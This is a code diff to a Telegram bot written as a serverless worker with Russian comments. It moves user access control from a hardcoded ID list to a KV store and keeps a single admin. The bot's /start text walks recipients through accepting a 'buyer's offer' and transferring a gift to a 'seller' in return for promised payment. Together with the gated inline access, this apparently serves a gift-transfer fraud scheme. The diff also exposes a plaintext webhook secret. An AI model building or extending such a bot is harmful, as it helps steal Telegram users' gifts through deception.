@@ -1,16 +1,5 @@
-const ADMIN_ID = 5151757168; 
+const ADMIN_ID = 5151757168; // Твой основной ID (единственный админ)
 const WEBHOOK_SECRET = "GarisOffer9231998"; 
-
-// Твой "твердый" список (если KV отвалится, эти люди все равно зайдут)
-const HARDCODED_ALLOWED_IDS = [
-  5151757168, // Твой основной ID
-  9021098137,
-  1290278554,
-  883619484,
-  7903610791,
-  5766476192,
-  8802398898
-];
 
 export default {
   async fetch(request, env, ctx) {
@@ -32,12 +21,12 @@ export default {
       const update = await request.json();
 
       // ==========================================
-      // КОМАНДЫ /add и /remove (ТОЛЬКО ДЛЯ АДМИНА)
+      // КОМАНДЫ /add и /remove (ТОЛЬКО ДЛЯ ГЛАВНОГО АДМИНА)
       // ==========================================
       if (update.message && (update.message.text.startsWith("/add ") || update.message.text.startsWith("/remove "))) {
         const senderId = update.message.from.id;
         
-        // Проверка: только ты можешь управлять доступом
+        // Проверка: только твой основной аккаунт
         if (senderId !== ADMIN_ID) {
             await callApi("sendMessage", { chat_id: update.message.chat.id, text: "⛔ У вас нет прав на эту команду." }, BOT_TOKEN);
             return new Response("OK", { status: 200 });
@@ -81,15 +70,20 @@ export default {
       }
 
       // ==========================================
-      // ПРОВЕРКА ДОСТУПА
+      // ПРОВЕРКА ДОСТУПА (ТОЛЬКО ЧЕРЕЗ БАЗУ KV)
       // ==========================================
       async function checkAccess(userId, username) {
-          if (HARDCODED_ALLOWED_IDS.includes(userId)) return true; 
+          // Твой основной аккаунт всегда имеет доступ
+          if (userId === ADMIN_ID) return true; 
+          
+          // Если базы нет - доступ только у тебя
           if (!kv) return false; 
           
+          // Ищем в базе по ID
           const byId = await kv.get(`allowed_id:${userId}`);
           if (byId) return true;
           
+          // Ищем в базе по юзернейму
           if (username) {
               const byName = await kv.get(`allowed_username:${username.toLowerCase()}`);
               if (byName) return true;
@@ -101,9 +95,7 @@ export default {
       if (update.message && update.message.text === "/start") {
         const chatId = update.message.chat.id;
         const userId = update.message.from.id;
-        const username = update.message.from.username || "";
 
-        // Инструкция приходит всем
         const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам предложение через бота\n2. Вы нажимаете «Принять» под сообщением с оффером\n3. После принятия оффера нажмите «🎁 Передать подарок»\n4. В открывшемся меню подарка выберите продавца и подтвердите передачу\n5. Дождитесь проверки и зачисления средств\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
         
         const startMarkup = {
@@ -119,8 +111,8 @@ export default {
         const userId = iq.from.id;
         const username = iq.from.username || "";
 
+        // Строгая проверка: если нет в базе, бот ничего не покажет
         const hasAccess = await checkAccess(userId, username);
-        // Если нет доступа - бот молчит в инлайн-режиме
         if (!hasAccess) return new Response("OK", { status: 200 });
 
         let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
